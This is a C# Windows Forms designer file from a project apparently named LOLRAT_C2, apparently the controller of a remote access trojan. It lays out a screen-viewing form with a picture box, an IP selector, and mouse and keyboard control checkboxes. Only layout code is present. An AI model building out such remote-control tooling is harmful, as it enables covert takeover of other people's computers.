namespace LOLRAT_C2
{
    partial class SS
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            pbSS = new PictureBox();
            cbSSIPS = new ComboBox();
            cbMouseControl = new CheckBox();
            cbKeyboardControl = new CheckBox();
            ((System.ComponentModel.ISupportInitialize)pbSS).BeginInit();
            SuspendLayout();
            // 
            // pbSS
            // 
            pbSS.Dock = DockStyle.Fill;
            pbSS.Location = new Point(0, 0);
            pbSS.Name = "pbSS";
            pbSS.Size = new Size(800, 450);
            pbSS.SizeMode = PictureBoxSizeMode.Zoom;
            pbSS.TabIndex = 0;
            pbSS.TabStop = false;
            // 
            // cbSSIPS
            // 
            cbSSIPS.FormattingEnabled = true;
            cbSSIPS.Location = new Point(333, 0);
            cbSSIPS.Name = "cbSSIPS";
            cbSSIPS.Size = new Size(121, 23);
            cbSSIPS.TabIndex = 1;
            // 
            // cbMouseControl
            // 
            cbMouseControl.AutoSize = true;
            cbMouseControl.Location = new Point(460, 4);
            cbMouseControl.Name = "cbMouseControl";
            cbMouseControl.Size = new Size(105, 19);
            cbMouseControl.TabIndex = 2;
            cbMouseControl.Text = "Mouse Control";
            cbMouseControl.UseVisualStyleBackColor = true;
            cbMouseControl.CheckedChanged += cbMouseControl_CheckedChanged;
            // 
            // cbKeyboardControl
            // 
            cbKeyboardControl.AutoSize = true;
            cbKeyboardControl.Location = new Point(244, 4);
            cbKeyboardControl.Name = "cbKeyboardControl";
            cbKeyboardControl.Size = new Size(119, 19);
            cbKeyboardControl.TabIndex = 3;
            cbKeyboardControl.Text = "Keyboard Control";
            cbKeyboardControl.UseVisualStyleBackColor = true;
            cbKeyboardControl.CheckedChanged += cbKeyboardControl_CheckedChanged;
            // 
            // SS
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(800, 450);
            Controls.Add(cbKeyboardControl);
            Controls.Add(cbMouseControl);
            Controls.Add(cbSSIPS);
            Controls.Add(pbSS);
            Name = "SS";
            Text = "SS";
            ((System.ComponentModel.ISupportInitialize)pbSS).EndInit();
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private PictureBox pbSS;
        private ComboBox cbSSIPS;
        private CheckBox cbMouseControl;
        private CheckBox cbKeyboardControl;
    }
}